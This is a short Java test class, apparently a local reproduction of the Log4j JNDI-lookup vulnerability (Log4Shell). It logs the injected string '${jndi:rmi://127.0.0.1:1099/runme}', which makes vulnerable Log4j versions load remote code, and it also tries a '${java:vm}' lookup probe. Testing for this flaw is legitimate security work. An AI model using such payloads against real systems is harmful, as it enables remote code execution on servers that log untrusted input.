package com.xinyuz.server;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {

    public static final Logger LOGGER = LogManager.getLogger();
    
    public static void main(String[] args) {
        String msg = "${java:vm}";
        msg = "${jndi:rmi://127.0.0.1:1099/runme}";
        
        LOGGER.error("Hello, {}", msg);
    }
}
